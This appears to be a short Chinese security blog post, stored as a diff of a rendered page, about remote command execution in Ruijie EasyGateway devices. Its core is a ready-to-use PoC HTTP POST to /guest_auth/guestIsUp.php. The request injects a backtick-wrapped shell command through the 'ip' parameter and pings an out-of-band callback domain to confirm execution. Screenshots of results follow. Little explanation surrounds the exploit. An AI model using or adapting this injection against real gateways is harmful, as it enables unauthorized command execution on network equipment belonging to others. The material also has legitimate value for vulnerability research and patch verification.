@@ -1,0 +1,34 @@
+I"�<h3 id="goby抓包">goby抓包</h3>
+
+<p><img src="/img/2020-12-29-锐捷易网关远程命令执行/image-20201229104331621.png" alt="image-20201229104331621" /></p>
+
+<p>估计是网络原因，请求还未到达goby log平台，客户端就去获取，因此未探测到漏洞。但是我们得到了poc，直接测试。</p>
+
+<h3 id="poc">Poc</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td><td class="rouge-code"><pre>POST /guest_auth/guestIsUp.php HTTP/1.1
+Host: x.x.x.x:xx
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+Content-Length: 56
+Content-Type: application/x-www-form-urlencoded
+Accept-Encoding: gzip
+
+mac=1&amp;ip=%60busybox ping -c 2 pingtest.xxx.ceye.io%60
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h3 id="测试结果">测试结果</h3>
+
+<p><img src="/img/2020-12-29-锐捷易网关远程命令执行/image-20201229102328491.png" alt="image-20201229102328491" /></p>
+
+<p><img src="/img/2020-12-29-锐捷易网关远程命令执行/image-20201229102942098.png" alt="image-20201229102942098" /></p>
+
+<p><img src="/img/2020-12-29-锐捷易网关远程命令执行/image-20201229103053455.png" alt="image-20201229103053455" /></p>
+:ET
